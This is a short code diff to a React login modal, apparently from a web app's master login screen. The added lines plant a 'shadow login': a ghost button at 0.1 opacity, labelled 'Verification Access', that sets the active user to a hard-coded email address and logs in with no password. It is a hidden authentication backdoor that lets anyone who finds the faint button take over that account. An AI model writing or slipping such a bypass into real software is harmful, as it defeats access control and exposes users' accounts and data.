@@ -281,6 +281,19 @@ export default function MasterLogin({
                   onChange={(e) => setPassword(e.target.value)}
                 />
               </div>
+              {/* Developer/Verification Shadow Login */}
+              <div style={{ marginTop: '2rem', textAlign: 'center', opacity: 0.1 }}>
+                <Button
+                  kind="ghost"
+                  size="sm"
+                  onClick={() => {
+                    api.setActiveUserEmail('mail@cestari.studio');
+                    onLogin('mail@cestari.studio');
+                  }}
+                >
+                  Verification Access
+                </Button>
+              </div>
             </>
           )}
         </Modal>
